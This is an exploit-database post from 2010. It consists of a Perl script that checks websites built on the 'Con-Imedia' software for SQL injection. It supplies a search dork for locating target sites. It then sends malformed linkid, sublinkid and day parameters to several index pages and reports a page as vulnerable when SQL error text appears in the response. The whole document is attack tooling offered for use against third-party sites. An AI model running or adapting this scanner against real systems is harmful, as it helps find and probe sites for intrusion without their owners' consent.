# Exploit Titre: IMEDIA (index.php) SQL Injection Vulnerability
# Date: 19-05-2010
# Auteur: Kannibal615
# Link Software: N/A
# Version: N/A
# Test� sur: ALL
# CVE: N/A
# Code: 

# DORK : Powered by: Con-Imedia


#!usr/bin/perl -w

use HTTP::Request;
use LWP::UserAgent;

system ("cls");
print "\n";
print "  @@    @@  @@@@@@     @@    @@    @@@@    @@@@@@@  @@  @@   @@@@@@@  @@@@@\n";
print "  @@    @@  @@   @@    @@    @@   @@  @@   @@       @@ @@    @@       @@   @@\n";
print "  @@    @@  @@ @@@     @@@@@@@@  @@    @@  @@       @@@@     @@@@@@   @@   @@\n";
print "   @@  @@   @@ @@@     @@@@@@@@  @@@@@@@@  @@       @@ @@    @@@@@@   @@ @@\n";
print "    @@@@    @@   @@    @@    @@  @@    @@  @@       @@  @@   @@       @@   @@\n";
print "     @@     @@@@@@     @@    @@  @@    @@  @@@@@@@  @@   @@  @@@@@@@  @@    @@\n\n";
print "                  LA ILAH ILLA ALLAH MOUHAMED RASOUL ALLAH\n\n";
print "\n\n";
print "[*]Coded By: Kannibal615 > Tunisian Genius Security > zn[at]live[dot]de\n\n";
print "[*]Greetz 1: My Best Friend AYMEN > THE P!RATOR\n";
print '[*]Greetz 2: Pc-InseCt/alghaking/emptyzero/V!Ru$_T4ckJ3n';
print "\n[*]Greetz 3: To All VBHACKER.NET Members\n";
print "[*]Dork    : Powered by: Con-Imedia\n";
print "[*]Usage   : k615>[target here]\n";
print "[*]Exemple : k615> www.target.com\n";
print "\n";
print "k615>";

$input=<>;
chomp $input;

if ( $input !~ /^http:/ ) {
$input = 'http://' . $input;
}
if ( $input !~ /\/$/ ) {
$input = $input . '/';
}


@path=('index1.php?linkid=999.9"','index1.php?sublinkid=999.9"','index1.php?linkid=&sublink=999.9"',
'index2.php?linkid=999.9"','index3.php?day=999.9"');

foreach $ways(@path){

$final=$input.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

if($response->content =~ /sql/ ||
$response->content =~ /SQL error/ ||
$response->content =~ /SQL/ ||
$response->content =~ /syntax/ ||
$response->content =~ /Invalid query/ ||
$response->content =~ /your SQL/ ||
$response->content =~ /MySQL/ ||
$response->content =~ /at line 1/ ||
$response->content =~ /MySQL server/ ||
$response->content =~ /version for/ ||
$response->content =~ /Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near/ ||
$response->content =~ /fetch/
){
print "[+] Vulnerable -> $final\n";
}
else{
print "[-] Not Vulner <- $final\n";
}
}
print "\n\nSOBHAN ALLAH\n";
print "press enter to exit";
$enter=<>;




#db-exploit 19-05-2010
#Coded By Kannibal615
#Tunisian Genius Security